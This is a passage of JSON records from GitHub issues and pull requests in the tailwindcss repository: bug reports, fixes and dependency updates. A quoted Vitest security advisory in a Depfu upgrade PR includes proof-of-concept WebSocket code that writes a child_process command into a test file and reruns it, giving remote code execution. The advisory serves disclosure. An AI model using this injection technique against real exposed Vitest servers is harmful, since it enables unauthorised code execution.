class=\"pl-c1\">data</span><span class=\"pl-kos\">)</span>\n<span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span>\n<span class=\"pl-s1\">ws</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">addEventListener</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">'open'</span><span class=\"pl-kos\">,</span> <span class=\"pl-kos\">(</span><span class=\"pl-kos\">)</span> <span class=\"pl-c1\">=&gt;</span> <span class=\"pl-kos\">{</span>\n    <span class=\"pl-s1\">ws</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">send</span><span class=\"pl-kos\">(</span><span class=\"pl-v\">Flatted</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">stringify</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span> <span class=\"pl-c1\">t</span>: <span class=\"pl-s\">'q'</span><span class=\"pl-kos\">,</span> <span class=\"pl-c1\">i</span>: <span class=\"pl-s1\">crypto</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">randomUUID</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span> <span class=\"pl-c1\">m</span>: <span class=\"pl-s\">\"getFiles\"</span><span class=\"pl-kos\">,</span> <span class=\"pl-c1\">a</span>: <span class=\"pl-kos\">[</span><span class=\"pl-kos\">]</span> <span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span>\n\n    <span class=\"pl-k\">const</span> <span class=\"pl-s1\">testFilePath</span> <span class=\"pl-c1\">=</span> <span class=\"pl-s\">\"/path/to/test-file/basic.test.ts\"</span> <span class=\"pl-c\">// use a test file returned from the response of \"getFiles\"</span>\n\n    <span class=\"pl-c\">// edit file content to inject command execution</span>\n    <span class=\"pl-s1\">ws</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">send</span><span class=\"pl-kos\">(</span><span class=\"pl-v\">Flatted</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">stringify</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span>\n      <span class=\"pl-c1\">t</span>: <span class=\"pl-s\">'q'</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">i</span>: <span class=\"pl-s1\">crypto</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">randomUUID</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">m</span>: <span class=\"pl-s\">\"saveTestFile\"</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">a</span>: <span class=\"pl-kos\">[</span><span class=\"pl-s1\">testFilePath</span><span class=\"pl-kos\">,</span> <span class=\"pl-s\">\"import child_process from 'child_process';child_process.execSync('calc')\"</span><span class=\"pl-kos\">]</span>\n    <span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span>\n    <span class=\"pl-c\">// rerun the tests to run the injected command execution code</span>\n    <span class=\"pl-s1\">ws</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">send</span><span class=\"pl-kos\">(</span><span class=\"pl-v\">Flatted</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">stringify</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span>\n      <span class=\"pl-c1\">t</span>: <span class=\"pl-s\">'q'</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">i</span>: <span class=\"pl-s1\">crypto</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">randomUUID</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">m</span>: <span class=\"pl-s\">\"rerun\"</span><span class=\"pl-kos\">,</span>\n      <span class=\"pl-c1\">a</span>: <span class=\"pl-kos\">[</span><span class=\"pl-s1\">testFilePath</span><span class=\"pl-kos\">]</span>\n    <span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span>\n<span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span></pre></div>\n<h3 dir=\"auto\">Impact</h3>\n<p dir=\"auto\">This vulnerability can result in remote code execution for users that are using Vitest serve API.</p></blockquote>\n</details>\n\n<details>\n<summary>Release Notes</summary>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.9\">2.1.9</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.8\">2.1.8</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.7\">2.1.7</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.6\">2.1.6</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.5\">2.1.5</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.4\">2.1.4</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.3\">2.1.3</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.2\">2.1.2</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.1\">2.1.1</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<h4><a href=\"https://github.com/vitest-dev/vitest/releases/tag/v2.1.0\">2.1.0</a></h4>\n\n<blockquote><em>More info than we can show here.</em></blockquote>\n<p><em>Does any of this look wrong? <a href=\"https://depfu.com/packages/npm/vitest/feedback\">Please let us know.</a></em></p>\n</details>\n\n<details>\n<summary>Commits</summary>\n<p><a href=\"https://github.com/vitest-dev/vitest/compare/99452a712c83e4e90a8afd5675e6573e1c22a43a...c9e59a089d94642eea29a43f2ee1986a5afb99c6\">See the full diff on Github</a>. The new version differs by more commits than we can show here.</p>\n</details>\n\n\n\n\n\n\n\n\n\n\n\n\n---\n![Depfu Status](https://depfu.com/badges/edd6acd35d74c8d41cbb540c30442adf/stats.svg)\n\n[Depfu](https://depfu.com) will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with `@depfu rebase`.\n\n<details><summary>All Depfu comment commands</summary>\n<blockquote><dl>\n<dt>@‚Äãdepfu rebase</dt><dd>Rebases against your default branch and redoes this update</dd>\n<dt>@‚Äãdepfu recreate</dt><dd>Recreates this PR, overwriting any edits that you've made to it</dd>\n<dt>@‚Äãdepfu merge</dt><dd>Merges this PR once your tests are passing and conflicts are resolved</dd>\n<dt>@‚Äãdepfu cancel merge</dt><dd>Cancels automatic merging of this PR</dd>\n<dt>@‚Äãdepfu close</dt><dd>Closes this PR and deletes the branch</dd>\n<dt>@‚Äãdepfu reopen</dt><dd>Restores the branch and reopens this PR (if it's closed)</dd>\n<dt>@‚Äãdepfu pause</dt><dd>Ignores all future updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu pause [minor|major]</dt><dd>Ignores all future minor/major updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu resume</dt><dd>Future versions of this dependency will create PRs again (leaves this PR as is)</dd>\n</dl></blockquote>\n</details>\n\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16253","RelatedDescription":"Open PR \"üö® [security] Update vitest 2.0.5 ‚Üí 2.1.9 (minor)\" (#16253)"},{"Id":"2830871229","IsPullRequest":false,"CreatedAt":"2025-02-04T17:27:20","Actor":"khanakia","Number":"16252","RawContent":null,"Title":"All the stylesheets CSS file loading twice on build","State":"open","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\nv4.0.2\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nreact-router framework 7.1.3\n\n**What version of Node.js are you using?**\n\nv22.12.0\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nmacOS\n\n**Reproduction URL**\n\n- Clone the Repo https://github.com/khanakia/reactrouter_css_loading_twice\n- `pnpm build`\n- Run `http-server-spa build/client index.html 8090` to preview the build\n\n**Describe your issue**\n\nIssue is described here \n\nhttps://github.com/remix-run/react-router/issues/12940#event-16182494636\n\n\n","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16252","RelatedDescription":"Open issue \"All the stylesheets CSS file loading twice on build\" (#16252)"},{"Id":"2827840002","IsPullRequest":true,"CreatedAt":"2025-02-04T14:43:49","Actor":"philipp-spiess","Number":"16210","RawContent":null,"Title":"Don't crash when setting JS theme value to `null`","State":"closed","Body":"Closes #16035\r\n\r\nIn v3 it was possible to unset a specific color namespace by setting doing something like this:\r\n\r\n```js\r\nexport default {\r\n  theme: {\r\n    extend: {\r\n      colors: {\r\n        red: null,\r\n      },\r\n    },\r\n  },\r\n}\r\n```\r\n\r\nThis pattern would crash in v4 right now due to the theme access function not being able to work on the red property being a `null`. This PR fixes this crash.\r\n\r\nHowever it leaves the behavior as-is for now so that the red namespace _defined via CSS will still be accessible_. This is technically different from v3 but fixing this would be more work as we only allow unsetting top-level namespaces in the interop layer (via the non-`extend`-theme-object). I would recommend migrating to the v4 API for doing these partial namespace resets if you want to get rid of the defaults in v4:\r\n\r\n```css\r\n@theme {\r\n  --color-red-*: initial;\r\n}\r\n```\r\n\r\n## Test plan\r\n\r\nThe crash was mainly captured via the test in `compat/config.test.ts` but I've added two more tests across the different levels of abstractions so that it's clear what `null` should be doing.","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16210","RelatedDescription":"Closed or merged PR \"Don't crash when setting JS theme value to `null`\" (#16210)"},{"Id":"2828884588","IsPullRequest":true,"CreatedAt":"2025-02-04T14:14:54","Actor":"depfu[bot]","Number":"16225","RawContent":null,"Title":"Update @parcel/watcher-linux-x64-musl 2.5.0 ‚Üí 2.5.1 (patch)","State":"closed","Body":"\n\n\n\n\nHere is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.\n\n### What changed?\n\n\n\n\n#### ‚ú≥Ô∏è @‚Äãparcel/watcher-linux-x64-musl (2.5.0 ‚Üí 2.5.1) ¬∑ [Repo](https://github.com/parcel-bundler/watcher)\n\n\n\n<details>\n<summary>Release Notes</summary>\n<h4><a href=\"https://github.com/parcel-bundler/watcher/releases/tag/v2.5.1\">2.5.1</a></h4>\n\n<blockquote><ul dir=\"auto\">\n<li>Handle large changes from FS Events better in getEventsSince - <a href=\"https://bounce.depfu.com/github.com/parcel-bundler/watcher/pull/196\">#196</a>\n</li>\n<li>Fix use after free in kqueue backend</li>\n<li>fix: catch std:regex error - <a href=\"https://bounce.depfu.com/github.com/parcel-bundler/watcher/pull/195\">#195</a>\n</li>\n</ul></blockquote>\n<p><em>Does any of this look wrong? <a href=\"https://depfu.com/packages/npm/@parcel%2Fwatcher-linux-x64-musl/feedback\">Please let us know.</a></em></p>\n</details>\n\n<details>\n<summary>Commits</summary>\n<p><a href=\"https://github.com/parcel-bundler/watcher/compare/0ed1564ca45bd28440b383bb2fbf9d8f2274e49b...664695dbb2488d53f782c3e2b8791c4c114731fb\">See the full diff on Github</a>. The new version differs by 9 commits:</p>\n<ul>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/664695dbb2488d53f782c3e2b8791c4c114731fb\"><code>v2.5.1</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/481284a8667468fadf8535e4e91f5dfd0d346092\"><code>fix: catch std:regex error (#195)</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/8496a2bcd809f8f3164c0b8a366743d3da981ec8\"><code>ignore wasm differences on linux</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/ab5da2fcccf43aec18bdff48317179a761c7900b\"><code>Fix use after free in kqueue backend</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/de6f13d3596436592081db53917f9d8329a629c9\"><code>Handle large changes from FS Events better in getEventsSince (#196)</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/b49bc2d0ed390e6f554b18e7e4f06bb625a4927c\"><code>Add workflow_dispatch trigger to test workflow</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/a603f809f6ae9cd638ff25a7b544456d01eef79b\"><code>Copy files</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/f22db2ba074c745f5ea121f5869a4cc691878813\"><code>install git</code></a></li>\n<li><a href=\"https://github.com/parcel-bundler/watcher/commit/6dc87112e100d2fe8486bd3c68c1a28e1e48a1da\"><code>Build updates</code></a></li>\n</ul>\n</details>\n\n\n\n\n\n\n\n\n\n\n\n\n---\n![Depfu Status](https://depfu.com/badges/edd6acd35d74c8d41cbb540c30442adf/stats.svg)\n\n[Depfu](https://depfu.com) will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with `@depfu rebase`.\n\n<details><summary>All Depfu comment commands</summary>\n<blockquote><dl>\n<dt>@‚Äãdepfu rebase</dt><dd>Rebases against your default branch and redoes this update</dd>\n<dt>@‚Äãdepfu recreate</dt><dd>Recreates this PR, overwriting any edits that you've made to it</dd>\n<dt>@‚Äãdepfu merge</dt><dd>Merges this PR once your tests are passing and conflicts are resolved</dd>\n<dt>@‚Äãdepfu cancel merge</dt><dd>Cancels automatic merging of this PR</dd>\n<dt>@‚Äãdepfu close</dt><dd>Closes this PR and deletes the branch</dd>\n<dt>@‚Äãdepfu reopen</dt><dd>Restores the branch and reopens this PR (if it's closed)</dd>\n<dt>@‚Äãdepfu pause</dt><dd>Ignores all future updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu pause [minor|major]</dt><dd>Ignores all future minor/major updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu resume</dt><dd>Future versions of this dependency will create PRs again (leaves this PR as is)</dd>\n</dl></blockquote>\n</details>\n\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16225","RelatedDescription":"Closed or merged PR \"Update @parcel/watcher-linux-x64-musl 2.5.0 ‚Üí 2.5.1 (patch)\" (#16225)"},{"Id":"2830346672","IsPullRequest":true,"CreatedAt":"2025-02-04T14:14:53","Actor":"philipp-spiess","Number":"16248","RawContent":null,"Title":"Upgrade `@parcel/watcher` to `2.5.1`","State":"closed","Body":"Closes #16225","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16248","RelatedDescription":"Closed or merged PR \"Upgrade `@parcel/watcher` to `2.5.1`\" (#16248)"},{"Id":"2827428655","IsPullRequest":true,"CreatedAt":"2025-02-04T14:13:18","Actor":"philipp-spiess","Number":"16206","RawContent":null,"Title":"Ensure first argument to `var(‚Ä¶)` still unescapes `\\_`","State":"closed","Body":"Resolves #16170\r\n\r\nThis PR fixes an issue where the previously opted-out escaping of the first argument for the `var(‚Ä¶)` function was not unescaped at all. This was introduced in https://github.com/tailwindlabs/tailwindcss/pull/14776 where the intention was to not require escaping of underscores in the var function (e.g. `ml-[var(--spacing-1_5)]`). However, I do think it still makes sense to unescape an eventually escaped underline for consistency.\r\n\r\n## Test plan\r\n\r\nThe example from #1670 now parses as expected:\r\n\r\n<img width=\"904\" alt=\"Screenshot 2025-02-03 at 13 51 35\" src=\"https://github.com/user-attachments/assets/cac0f06e-37da-4dcb-a554-9606d144a8d5\" />\r\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16206","RelatedDescription":"Closed or merged PR \"Ensure first argument to `var(‚Ä¶)` still unescapes `\\_`\" (#16206)"},{"Id":"2830375820","IsPullRequest":true,"CreatedAt":"2025-02-04T14:06:14","Actor":"philipp-spiess","Number":"16249","RawContent":null,"Title":"Upgrade various dependencies","State":"open","Body":"Just a bunch of version upgrades. Also pins `typescript` and `vitest` to the patch due to them causing issues when upgraded.","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16249","RelatedDescription":"Open PR \"Upgrade various dependencies\" (#16249)"},{"Id":"2830269323","IsPullRequest":true,"CreatedAt":"2025-02-04T13:29:12","Actor":"philipp-spiess","Number":"16245","RawContent":null,"Title":"Ensure `hidden` comes after all other display types","State":"open","Body":"","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16245","RelatedDescription":"Open PR \"Ensure `hidden` comes after all other display types\" (#16245)"},{"Id":"2827230021","IsPullRequest":true,"CreatedAt":"2025-02-04T13:22:34","Actor":"RobinMalfait","Number":"16203","RawContent":null,"Title":"Ensure `@import url(‚Ä¶)` is hoisted","State":"closed","Body":"This PR fixes an issue where if you use `@import url(‚Ä¶);` _after_ the `@import \"tailwindcss\";`, then invalid CSS is being generated.\r\n\r\nThis is because the `@import \"tailwindcss\";` directive is being replaced with the actual generated CSS variables, utilities, etc. but the `@import url(‚Ä¶);` is kept as-is (Tailwind CSS doesn't handle these). This means that in the final CSS the `@import url(‚Ä¶)` could be in the middle of the generated CSS which is invalid.\r\n\r\n```css\r\n/* Invalid: */\r\n@import \"tailwindcss\";\r\n@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');\r\n```\r\n\r\n```css\r\n/* Valid: */\r\n@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');\r\n@import \"tailwindcss\";\r\n```\r\n\r\nWhile the above examples should both work from a CSS perspective, this PR makes sure to hoist the `@import url(‚Ä¶);` rules. All non-external imports will be inlined already.\r\n\r\nOnce this PR is merged, both these situations are valid:\r\n```css\r\n/* Valid: */\r\n@import \"tailwindcss\";\r\n@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');\r\n```\r\n\r\n```css\r\n/* Valid: */\r\n@import \"tailwindcss\";\r\n@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');\r\n```\r\n\r\nIn order to do this correctly, we also have to make sure that the license comment and `@charset` is in the correct spot.\r\n\r\n### Test plan\r\n\r\n- Added a simple unit test\r\n- Added an integration test\r\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16203","RelatedDescription":"Closed or merged PR \"Ensure `@import url(‚Ä¶)` is hoisted\" (#16203)"},{"Id":"2830162026","IsPullRequest":true,"CreatedAt":"2025-02-04T12:49:46","Actor":"philipp-spiess","Number":"16244","RawContent":null,"Title":"Standalone: Use bun baseline builds for Linux","State":"open","Body":"Closes #15181\r\n\r\nThis PR changes the Standalone builds to use bun baseline instead. This compiles to a reduced instruction set and should work around the compatibility issues experienced across older server hardware. \r\n\r\nNote: This PR is currently being tested and not ready to merge just yet. You can test yourself by using the x64 libc version on:\r\n\r\n```\r\nhttps://assets.tailwindcss.com/tailwindcss-linux-x64\r\nhttps://assets.tailwindcss.com/tailwindcss-linux-x64-musl\r\nhttps://assets.tailwindcss.com/tailwindcss-linux-arm64\r\nhttps://assets.tailwindcss.com/tailwindcss-linux-arm64-musl\r\n```","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16244","RelatedDescription":"Open PR \"Standalone: Use bun baseline builds for Linux\" (#16244)"},{"Id":"2829646170","IsPullRequest":false,"CreatedAt":"2025-02-04T11:45:24","Actor":"DreierF","Number":"16233","RawContent":null,"Title":"[v4] [Vite] Invalid declaration","State":"closed","Body":"**What version of Tailwind CSS are you using?**\n\n4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nvite\n\n**What version of Node.js are you using?**\n\nv23.7.0\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nmacOS\n\n**Reproduction URL**\n\nhttps://codesandbox.io/p/devbox/laughing-williamson-s5kvz2?file=%2Fmain.js%3A4%2C37\n\n**Describe your issue**\n\nRunning `vite build` in the linked CodeSandbox results in:\n```\nworkspace git:(main) ‚úó pnpm build\n\n> vite-js@0.0.0 build /project/workspace\n> vite build\n\nvite v6.0.11 building for production...\n‚úì 418 modules transformed.\nx Build failed in 3.40s\nerror during build:\n[@tailwindcss/vite:generate:build] Invalid declaration: `import * as maplibreGl from \"/project/workspace/node_modules/.pnpm/maplibre-gl@4.7.1/node_modules/maplibre-gl/dist/maplibre-gl.css\"`\nfile: /project/workspace/node_modules/.pnpm/maplibre-gl@4.7.1/node_modules/maplibre-gl/dist/maplibre-gl.css?commonjs-proxy\n    at X (file:///project/workspace/node_modules/.pnpm/tailwindcss@4.0.3/node_modules/tailwindcss/dist/lib.mjs:3:1804)\n    at tl (file:///project/workspace/node_modules/.pnpm/tailwindcss@4.0.3/node_modules/tailwindcss/dist/lib.mjs:33:1566)\n    at tt (file:///project/workspace/node_modules/.pnpm/@tailwindcss+node@4.0.3/node_modules/@tailwindcss/node/dist/index.mjs:10:3328)\n    at _.generate (file:///project/workspace/node_modules/.pnpm/@tailwindcss+vite@4.0.3_vite@6.0.11/node_modules/@tailwindcss/vite/dist/index.mjs:1:5387)\n    at Object.transform (file:///project/workspace/node_modules/.pnpm/@tailwindcss+vite@4.0.3_vite@6.0.11/node_modules/@tailwindcss/vite/dist/index.mjs:1:3735)\n    at Object.handler (file:///project/workspace/node_modules/.pnpm/vite@6.0.11/node_modules/vite/dist/node/chunks/dep-M1IYMR16.js:51337:15)\n    at file:///project/workspace/node_modules/.pnpm/rollup@4.24.4/node_modules/rollup/dist/es/shared/node-entry.js:20789:40\n‚ÄâELIFECYCLE‚Äâ Command failed with exit code 1.\n```\n\nThe same codebase used to work when running tailwind 3 via postcss. I also tried excluding the file via `content: [\"./index.html\", \"./**/*.js\", \"!**/maplibre-gl.css\"]`, but without any success.\n","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16233","RelatedDescription":"Closed issue \"[v4] [Vite] Invalid declaration\" (#16233)"},{"Id":"2829833736","IsPullRequest":true,"CreatedAt":"2025-02-04T11:45:23","Actor":"philipp-spiess","Number":"16238","RawContent":null,"Title":"Vite: Skip parsing stylesheets with the `?commonjs-proxy` flag","State":"closed","Body":"Fixes #16233\r\n\r\nVite has a number of special parameters that can be appended to `.css` files that make it actually load as a JavaScript module. One such parameter that we haven't handled before is the `?commonjs-proxy` flag. When importing e.g. `plotly.js/lib/core`, the dependency tree would eventually load a file called `*.css?commonjs-proxy`. We previously scanned this for candidates even though it was not, in-fact, a stylesheet. \r\n\r\nThis PR fixes this by adding the `?commonjs-proxy` to the ignore list. I have also updated `SPECIAL_QUERY_RE` to more closely match the Vite implementation. It does seem like this was the only condition we were missing, though: https://github.com/vitejs/vite/blob/2b2299cbac37548a163f0523c0cb92eb70a9aacf/packages/vite/src/node/plugins/css.ts#L511-L517\r\n\r\n## Test plan\r\n\r\nAdd and import `plotly.js/lib/core` into a Vite app. I also added an integration test to do that.","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16238","RelatedDescription":"Closed or merged PR \"Vite: Skip parsing stylesheets with the `?commonjs-proxy` flag\" (#16238)"},{"Id":"2829062618","IsPullRequest":false,"CreatedAt":"2025-02-04T11:38:32","Actor":"ony3000","Number":"16227","RawContent":null,"Title":"[v4] Custom keyframes are not generated if the value of an animation variable contains a line break between the keyframe name and duration","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\nv4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nVite 6.0.5\n\n**What version of Node.js are you using?**\n\nv18.18.2\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nWSL\n\n**Reproduction URL**\n\nhttps://play.tailwindcss.com/PyXgGbc7uU?file=css\n\n**Describe your issue**\n\nIf the keyframe name and duration are on different lines, the custom keyframe is not generated.\n\n```\n--animate-foo: <keyframe-name>\n  <duration> <easing-function> <delay> <iteration-count> <direction> <fill-mode> <play-state>\n```\n\nIf the keyframe name and duration are on the same line, the custom keyframe is generated.\n\n```\n--animate-foo: <keyframe-name> <duration>\n  <easing-function> <delay> <iteration-count> <direction> <fill-mode> <play-state>\n```","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16227","RelatedDescription":"Closed issue \"[v4] Custom keyframes are not generated if the value of an animation variable contains a line break between the keyframe name and duration\" (#16227)"},{"Id":"2829754232","IsPullRequest":true,"CreatedAt":"2025-02-04T11:38:31","Actor":"RobinMalfait","Number":"16237","RawContent":null,"Title":"Ensure we always emit `@keyframes` correctly","State":"closed","Body":"This PR fixes an issue where we didn't always generate the `@keyframes`. Right now we only generate `@keyframes` _if_ they are being used as one of the `--animate-*` utilities.\n\nHowever, if your `--animate-*` definition is pretty long such that it is defined across multiple lines, then we didn't always generate the `@keyframes` for it.\n\nThis is because the animation name would look like `'my-animation-name\\n'` instead of `'my-animation-name'`.\n\nFixes: #16227\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16237","RelatedDescription":"Closed or merged PR \"Ensure we always emit `@keyframes` correctly\" (#16237)"},{"Id":"2828244211","IsPullRequest":false,"CreatedAt":"2025-02-04T11:13:46","Actor":"PLManuel","Number":"16217","RawContent":null,"Title":"[v4] color error with animation-timeline","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\n4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nAstro 5.2.3\n\n**What version of Node.js are you using?**\n\nv20.12.2\n\n**What browser are you using?**\n\n[Versi√≥n 1.74.51 Chromium: 132.0.6834.160 (Build oficial) (64 bits)]\n\n**What operating system are you using?**\n\nWindows 10\n\n**Reproduction URL**\n\nhttps://play.tailwindcss.com/Zm9MoXD9AA\n\nhttps://github.com/PLManuel/prueba-tailwind4\n\nhttps://drive.google.com/file/d/1bWsExht0ENBIhqM7P3X3WVX2FqdS0Gyl/view?usp=sharing\n\n**Describe your issue**\n\nI'm making an animation between two colors and the final color of the animation doesn't match the color code. This also happens in the background. The error appeared after uninstalling tailwind 3 and installing the new version with \"pnpm astro add tailwind\", to move to version 4.","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16217","RelatedDescription":"Closed issue \"[v4] color error with animation-timeline\" (#16217)"},{"Id":"2828987500","IsPullRequest":false,"CreatedAt":"2025-02-04T11:05:17","Actor":"NormandoHall","Number":"16226","RawContent":null,"Title":"V4 Segmentation fault","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\n`Tailwind v4.0.3`\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\n```\nsveltekit: v2.17.1\nvitejs: v6.0.11\n```\n\n**What version of Node.js are you using?**\n\n`Node v22.13.1`\n\n**What operating system are you using?**\n\n`Linux Centos 7 x86_64`\n\n**Reproduction URL**\n\nhttps://github.com/NormandoHall/tw4\n\n**Describe your issue**\n\nUsing the guide to setup in sveltekit: https://tailwindcss.com/docs/installation/framework-guides/sveltekit","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16226","RelatedDescription":"Closed issue \"V4 Segmentation fault\" (#16226)"},{"Id":"2828796768","IsPullRequest":false,"CreatedAt":"2025-02-04T10:23:43","Actor":"tsiotska","Number":"16224","RawContent":null,"Title":"Cannot start Nuxt with new Tailwind version","State":"closed","Body":"\nv4.0.1 -v4.0.3 (compatible with prev versions e.g. 3.)\nNUXT 3.15.2\nNode v20.12.2\n @nuxtjs/tailwindcss: \"^6.13.1\",\n\nI am not sure If issue refers to tailwind, I just downgraded to 3.4.17 and don't see message below anymore:\n\n`ERROR  Cannot start nuxt:  It looks like you're trying to use tailwindcss directly as a PostCSS plugin. The PostCSS plugin has moved to a separate package, so to continue using Tailwind CSS with PostCSS you'll need to install @tailwindcss/postcss and update your PostCSS configuration.`\n\nYes, I tried to install plugin and update postcss, it's just not the way it gotta work and indeed it doesn't. If anyone interested please take a better look than I did. :)\n","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16224","RelatedDescription":"Closed issue \"Cannot start Nuxt with new Tailwind version\" (#16224)"},{"Id":"2829389309","IsPullRequest":false,"CreatedAt":"2025-02-04T10:22:48","Actor":"rozsazoltan","Number":"16229","RawContent":null,"Title":"[v4] Dynamically generated margin, padding, width, height, etc.; does not work with decimal numbers","State":"closed","Body":"> [!NOTE]\n> Tailwind CSS: v4.0.3\n\n**Reproduction**\n\n```\n<div class=\"w-120.5 h-120.5 bg-green-50\"></div>\n<div class=\"w-120.1 h-120.5 bg-red-50\"></div>\n```\n\n* [TailwindCSS v4 Playground](https://play.tailwindcss.com/wMtTT4nFSN)\n\n**Describe your issue**\n\nA central `--spacing` variable has been introduced, allowing infinite generation of `margin`, `padding`, `width`, `height`, etc.\n\n|Class|Styles|\n|---|---|\n|`m-<number>`|`margin: calc(var(--spacing) * <number>);`|\n|`-m-<number>`|`margin: calc(var(--spacing) * -<number>);`|\n\nFrom this, I would assume that it should accept any integer and decimal number. However, it only works perfectly with integers and `.5` decimals; values like `.1`, `.2`, ... `.9` do not work.","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16229","RelatedDescription":"Closed issue \"[v4] Dynamically generated margin, padding, width, height, etc.; does not work with decimal numbers\" (#16229)"},{"Id":"2829496181","IsPullRequest":false,"CreatedAt":"2025-02-04T10:13:49","Actor":"TechMainul-dev","Number":"16230","RawContent":null,"Title":"es lint warn for Property is ignored due to the display. With 'display: block' , vertical-align should not be used.","State":"closed","Body":"**What version of Tailwind CSS are you using?**\n\n\"@tailwindcss/vite\": \"^4.0.3\",\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\n\"eslint\": \"^9.19.0\", \"prettier\": 